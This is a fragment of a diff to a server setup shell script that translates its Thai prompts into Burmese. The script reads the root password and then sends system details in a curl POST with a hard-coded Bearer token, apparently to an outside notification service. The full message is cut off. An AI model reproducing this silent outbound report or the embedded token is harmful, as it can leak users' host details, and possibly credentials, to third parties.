@@ -4,7 +4,7 @@ $(wget -qO- ipv4.icanhazip.com)
 
 echo "
 ╭━━━━━━━━━━━━━━━━━━━━━━━╮"
-echo " ┈┣ กรอกรหัสผ่าน root  "
+echo " ┈┣ စကားဝှက်ထည့်ပါ root  "
 echo " ╰━━━━━━━━━━━━━━━━━━━━━━━╯"
 read -p " : " pass
 
@@ -36,7 +36,7 @@ auto
 
 clear
 echo "
-ตั้งค่าเสร็จเรียบร้อย
+ဆက်တင်များ ပြီးပါပြီ
 "
 curl -X POST -H 'Authorization: Bearer 8QXhBz0jeUANsAq9ipZJy0SRxOMQ24FG3p3asWbM3XJ' -F 'message='"
 ระบบ: $(printf '%-14s' "$system")
